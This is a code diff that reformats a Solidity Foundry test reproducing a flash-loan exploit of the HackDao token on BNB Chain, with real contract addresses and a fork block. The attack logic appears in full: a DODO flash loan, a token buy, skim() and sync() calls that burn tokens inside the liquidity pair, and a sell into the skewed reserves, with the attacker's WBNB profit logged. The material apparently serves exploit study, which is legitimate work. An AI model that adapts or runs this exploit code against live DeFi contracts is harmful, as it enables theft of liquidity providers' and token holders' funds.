@@ -9,7 +9,7 @@ import "./interface.sol";
 // @Contract address
 // https://bscscan.com/address/0x94e06c77b02ade8341489ab9a23451f68c13ec1c#code
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     IERC20 HackDao = IERC20(0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     Uni_Pair_V2 Pair1 = Uni_Pair_V2(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2); // HackDao WBNB
@@ -20,23 +20,18 @@ contract ContractTest is DSTest{
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 18073756);
+        cheats.createSelectFork("bsc", 18_073_756);
     }
 
-    function testExploit() public{
-        WBNB.approve(address(Router), type(uint).max);
-        HackDao.approve(address(Router), type(uint).max);
-        DVM(dodo).flashLoan(1_900 * 1e18, 0, address(this), new bytes(1));
+    function testExploit() public {
+        WBNB.approve(address(Router), type(uint256).max);
+        HackDao.approve(address(Router), type(uint256).max);
+        DVM(dodo).flashLoan(1900 * 1e18, 0, address(this), new bytes(1));
 
-        emit log_named_decimal_uint(
-            "[End] Attacker WBNB balance after exploit",
-            WBNB.balanceOf(address(this)),
-            18
-        );
-
+        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public{
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
         // get HackDao
         buyHackDao();
         // call skim() to burn HackDao in lp
@@ -45,25 +40,20 @@ contract ContractTest is DSTest{
         Pair1.sync();
         Pair2.skim(address(Pair1));
         // sell HackDao
-        (uint reserve0, uint reserve1, ) = Pair1.getReserves(); // HackDao WBNB
-        uint amountAfter = HackDao.balanceOf(address(Pair1));
-        uint amountin = amountAfter - reserve0;
-        uint amountout = amountin * 9975 * reserve1 / (reserve0 * 10000 + amountin * 9975);
+        (uint256 reserve0, uint256 reserve1,) = Pair1.getReserves(); // HackDao WBNB
+        uint256 amountAfter = HackDao.balanceOf(address(Pair1));
+        uint256 amountin = amountAfter - reserve0;
+        uint256 amountout = amountin * 9975 * reserve1 / (reserve0 * 10_000 + amountin * 9975);
         Pair1.swap(0, amountout, address(this), "");
-        WBNB.transfer(dodo, 1_900 * 1e18);
+        WBNB.transfer(dodo, 1900 * 1e18);
     }
 
-    function buyHackDao() internal{
-        address [] memory path = new address[](2);
+    function buyHackDao() internal {
+        address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(HackDao);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
-
 }
